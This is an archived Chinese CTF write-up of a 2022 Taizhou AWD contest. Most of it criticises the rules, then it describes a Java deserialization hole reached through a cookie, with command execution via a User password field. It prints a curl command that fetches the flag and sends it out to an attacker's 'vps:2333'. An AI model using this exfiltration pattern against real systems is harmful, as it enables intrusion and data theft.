---
title: 2022 台州市赛线上 AWD 赛后小记
contest: 台州市赛 2022
year: 2022
difficulty: medium
vuln_type: deserialize
tags:
- AWD
- Java反序列化
- Fastjson1.2.15
- CC3
- CC4
- ROME
- SnakeYAML
- Fastjson本地回显
- 小米商城
attack_chain:
- ROOT.war 部署小米商城（User 实体 readObject）
- Cookie cuser 反序列化入口
- fastjson 1.2.15 + CC3 + CC4 + ROME 依赖
- User.password 字段被当命令直接执行
- 拿 fastjson-local-echo 工具做盲打回显
- flagserver 43.136.168.189 拿 flag 写环境变量
- curl vps:2333?flag=$flag 外带 flag
- 4h 24 轮 10min/轮 Java+PHP 攻陷 +10 被攻陷 -15
key_payload: '''flag=`curl http://43.136.168.189/index.php?token=3665_USR-20221125-6uv1t`'''
one_liner: Java AWD：User.password 触发命令执行，fastjson+CC3/4+ROME 链外带 flag。
lesson: Java AWD 优先找 readObject 入口；fastjson-local-echo 是不出网时的盲打回显神器。
quality: medium
full_path: 2022台州市赛线上AWD赛后小记.full.md
meta_path: 2022台州市赛线上AWD赛后小记.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2022 台州市赛线上 AWD 赛后小记。Java AWD：User.password 触发命令执行，fastjson+CC3/4+ROME 链外带 flag。。关键路径：ROOT.war 部署小米商城（User 实体 readObject） → Cookie cuser 反序列化入口 → fastjson 1.2.15 + CC3 + CC4 + ROME 依赖。经验：Java AWD 优...
category: web
subcategory: deserialization
tools_used:
- Java
- PHP
- curl
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/81475.html
reasoning_chain:
- '[触发点] AWD 4h 24 轮 10min/轮 Java+PHP → 假设：抢攻陷不抢加固 / [假设] 找 readObject 入口 / [动作] ROOT.war 部署小米商城 + Cookie cuser 反序列化 / [观察] User 实体 readObject / [下一步] User.password 触发命令'
- '[触发点] User.password 字段被当命令直接执行 → 假设：fastjson-local-echo 回显 / [动作] fastjson 1.2.15 + CC3 + CC4 + ROME链 / [观察]拿 flag / [下一步] flagserver'
- '[触发点] flagserver 43.136.168.189 → 假设：拿 flag 写环境变量 / [动作] curl vps:2333?flag=$flag / [观察] flag 外带 / [下一步] PHP 后门弱口令修复'
failed_attempts:
- 试图加固 Java 题 → 失败：无加固时间
- 试图 GOGO 出网 → 失败：内网严格
key_observations:
- Java AWD 优先找 readObject 入口
- fastjson-local-echo 是不出网时的盲打回显神器
- Cookie 反序列化是 AWD 经典入口
prerequisites:
- Java 反序列化 CC3/CC4/ROME 链
- fastjson 1.2.15 漏洞
- fastjson-local-echo 工具
- AWD 规则 + 防守策略
---
# 2022台州市赛线上AWD赛后小记

> 原文: https://www.ctfiot.com/81475.html
> ID: 81475

赛制

比赛时间：4个小时，10分钟一轮，共24轮，无加固时间 计分规则：攻陷其他队伍服务器一次加10分，被其他队伍攻陷扣15分，check不通过扣100分，起始分5000分 赛题：一个Java、一个PHP（参赛说明并没有说，比赛的时候才知道）

吐槽

有以下几个点：

作为一个AWD比赛，没有加固时间，离谱

比赛check写的稀烂，赛后有部分参赛选手表示删站check都能过

因为没有加固时间，所以选手需要抢时间去维护机器和代审，比赛一共是需要维护两台机器，一个Java一个PHP，其中PHP算是AWD中的常客了，除了check有点离谱之外没有什么好说的。另外说说Java，因为Java并不像PHP那样，直接修改PHP文件就能完成加固，Java的题还需要选手手动修改并部署war包，还需要执行restart.sh脚本才能重启服务，并且加固给的SSH是物理机的ctf用户权限，而网站是部署在Docker里的，题目设计的本意是好的，但是没给加固时间且每轮的时间非常短暂，只有10分钟，所以直到最后排名稳定下来我才了解到整道题的意图

正因为check写的稀烂，所以攻和防两方面，选择攻击的效益是最高的，而防守方面，大多数队伍估计只修复了PHP题中最明显的后门以及CMS的弱口令等

开局后flagserver还变动，只在比赛平台中悄咪咪放了一个公告，所以在审到漏洞写好脚本准备批量打的时候有点迷

由于是线上比赛，给的IP端都是不连续的，这在一定程度上考验了选手编写脚本的能力，但是在比赛过程中却变动部分IP，所以选手还需要手动diff不同的IP，而且变动了两次

比赛规则说不能删站，不能上通防waf，违者扣分甚至取消比赛资格，实际上呢，到处都是通防waf

最后，也是我觉得整个赛制中最离谱的，参赛队伍竟然每台机器可以不扣分重置三次，这很不合理，通常线下比赛AWD想要重置机器需要参赛选手签字并且扣除一部分分值，毕竟自己把站修垮了，还可以免扣分重置，且重置还需要一部分时间，对于10分钟一轮频率比较高的赛制，既然重置不扣分，那干脆在新的一轮刷新的时候重置机器，这样其他队伍岂不是在重置那段时间打不到了

针对Java题做解析

一开始其实并没有看Java题，因为考虑到大家应该都是先审PHP，先打PHP，所以还是先看PHP，在打了几轮之后，该修的修了，该打的打了，就得去想办法审点Java的洞打一打拉开分差，毕竟AWD在经过几轮之后分差相对固定，此时除非别人check过不了或者自己审出了新漏洞，否则几乎拉不进名次 这次给的Java题大概环境如下：

ssh上去是一个ctf宿主机用户，权限不高，没法提权，存在Docker相关命令但是权限不够

ctf用户能操作的就是部署war包并且重启服务

题目给了一个ROOT.war，里面是一个小米商城管理系统

在pojo中的User实体类存在readObject，并且这里直接把password作为命令来执行

CC3和CC4依赖

fastjson1.2.15

ROME

snakeyaml

https://github.com/depycode/fastjson-local-echo

入口点其实就在Cookie的cuser中

43.136.168.189是flagserver

把curl执行出来的flag给flag环境变量，然后curl外带到自己的服务器

flag=`curl http://43.136.168.189/index.php?token=3665_USR-20221125-6uv1t`;
curl vps:
2333?flag=$flag


```
flag=`curl http://43.136.168.189/index.php?token=3665_USR-20221125-6uv1t`;
curl vps:
2333?flag=$flag
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]